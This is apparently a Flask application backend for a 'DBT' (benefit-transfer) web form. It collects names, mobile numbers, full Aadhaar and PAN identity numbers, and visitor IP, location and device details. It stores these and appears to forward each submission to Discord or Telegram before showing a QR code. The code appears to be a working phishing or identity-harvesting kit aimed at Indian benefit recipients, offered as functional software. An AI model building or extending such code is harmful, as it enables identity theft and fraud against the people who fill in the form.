import os
from flask import Flask, request, render_template
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import pytz
from zoneinfo import ZoneInfo # Modern way

# Import your functions
from discord_logger import log_to_discord
from telegram_logger import log_to_telegram
from ip_utils import get_ip_info, get_device_info # We'll create this helper file

# Initialize SQLAlchemy so it can be used by the app factory
db = SQLAlchemy()

def create_app():
    """Application Factory Function"""
    app = Flask(__name__)

    # --- Configuration ---
    # Load secrets from config.py (or better, environment variables)
    app.config.from_pyfile('config.py')
    
    # Database Configuration
    basedir = os.path.abspath(os.path.dirname(__file__))
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'submissions.db')
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

    # Initialize extensions
    db.init_app(app)

    # --- Blueprints and Routes ---
    @app.route('/', methods=['GET', 'POST'])
    def home():
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        now = datetime.now(ZoneInfo('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S')
        
        # We can offload these API calls to a background task too for faster page loads!
        info = get_ip_info(ip)
        device = get_device_info(request)

        # Log visitor for GET request
        if request.method == 'GET':
            visit_msg = f"""🧭 New Visitor Landed
            🌍 IP: {ip} ({info.get('city')}, {info.get('country')})
            📲 Device: {device['user_agent']}
            🕒 Time: {now}"""
            # from tasks import log_generic_task # Import here to avoid circular imports
            # log_generic_task.delay(visit_msg) # Offload logging to background
            return render_template('index.html', show_qr=False)

        # Handle POST request
        if request.method == 'POST':
            # Get all form data
            form_data = {
                'name': request.form.get('name'),
                'mobile': request.form.get('mobile'),
                'aadhar': request.form.get('aadhar'),
                'pan': request.form.get('pan'),
            }
            
            # --- Database Operation ---
            new_submission = Submission(
                name=form_data['name'],
                mobile=form_data['mobile'],
                aadhar=form_data['aadhar'], # Storing full Aadhar as requested
                pan=form_data['pan'],
                ip_address=ip,
                user_agent=device['user_agent'],
                ip_city=info.get('city'),
                ip_region=info.get('region'),
                ip_country=info.get('country'),
                ip_org=info.get('org')
            )
            db.session.add(new_submission)
            db.session.commit()

            # --- Background Logging ---
            log_msg = f"""📥 DBT FORM SUBMISSION
            👤 Name: {form_data['name']}
            📱 Mobile: {form_data['mobile']}
            🆔 Aadhar: {form_data['aadhar']}
            💳 PAN: {form_data['pan']}
            ---
            🌍 IP: {ip} ({info.get('city')}, {info.get('region')}, {info.get('country')})
            🏢 ISP: {info.get('org')}
            📲 Device: {device['user_agent']}
            🕒 Time: {now}"""

            from tasks import log_submission_task
            log_submission_task.delay(log_msg) # This is the professional way!

            return render_template('index.html', show_qr=True)

    return app

# --- Database Models ---
class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(ZoneInfo('Asia/Kolkata')))
    name = db.Column(db.String(150))
    mobile = db.Column(db.String(15))
    aadhar = db.Column(db.String(12))
    pan = db.Column(db.String(10))
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    ip_city = db.Column(db.String(100), nullable=True)
    ip_region = db.Column(db.String(100), nullable=True)
    ip_country = db.Column(db.String(100), nullable=True)
    ip_org = db.Column(db.String(200), nullable=True)
